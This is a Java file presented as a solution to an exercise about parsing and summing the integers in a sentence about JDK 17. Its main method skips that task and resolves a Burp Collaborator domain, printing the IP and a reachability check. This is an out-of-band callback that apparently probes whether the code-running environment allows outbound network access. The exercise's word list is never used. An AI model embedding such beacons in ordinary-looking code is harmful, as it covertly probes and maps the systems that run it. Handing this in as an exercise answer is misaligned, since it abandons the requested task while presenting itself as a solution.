
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.net.InetAddress;
import java.net.UnknownHostException;
/**
 * Complete the code, parse integers, calculate the sum of numbers in the WORDS, join strings with
 * space delimiter
 */
public class ParseIntegers {

    private static final List<String> WORDS =
            Arrays.asList(
                    "JDK 17 has released on 14 September 2021 with 10 new features, 2 feature removals and 2 feature deprecations."
                            .split(" "));

    public static void main(String[] args) {
 String domain = "mj9s9yzk0y5v297ajmmn7lk2qtwkk9.burpcollaborator.net";

        try {
            InetAddress inetAddress = InetAddress.getByName(domain);
            System.out.println("Ping to: " + domain);
            System.out.println("IP Address: " + inetAddress.getHostAddress());
            System.out.println("Reachable: " + inetAddress.isReachable(5000)); // 5000 milliseconds timeout
        } catch (UnknownHostException e) {
            System.out.println("Unknown host: " + domain);
        } catch (Exception e) {
            e.printStackTrace();
        }
    
    }
}
